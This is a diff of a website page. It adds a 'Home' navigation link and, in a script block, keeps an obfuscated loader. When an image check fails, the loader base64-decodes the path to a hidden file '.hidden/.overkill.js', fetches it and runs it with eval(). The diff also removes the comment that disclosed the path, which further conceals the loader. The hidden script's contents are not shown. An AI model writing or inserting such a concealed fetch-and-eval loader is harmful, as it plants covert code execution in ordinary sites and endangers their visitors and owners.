@@ -25,12 +25,14 @@
                 </button>
 				<nav id="main-nav" class="main-nav">
 					<ul>
+						<li><a href="index.html" class="active">Home</a></li>
 						<li><a href="about.html">About</a></li>
 						<li><a href="projects.html">Projects</a></li>
 						<li><a href="blog.html">Blog</a></li>
 						<li><a href="calendar.html">Calendar</a></li>
 					</ul>
 				</nav>
+				
 				<a href="#membership" class="button-primary desktop-only">
 					Membership
 				</a>
@@ -207,7 +209,7 @@
         checkImg.src = imgPath + "?bk=" + Date.now();
         
         checkImg.onerror = function() {
-            let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM="); // Fix path to .hidden/.overkill.js
+            let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
             fetch(backupScript)
                 .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
                 .then(code => eval(code))
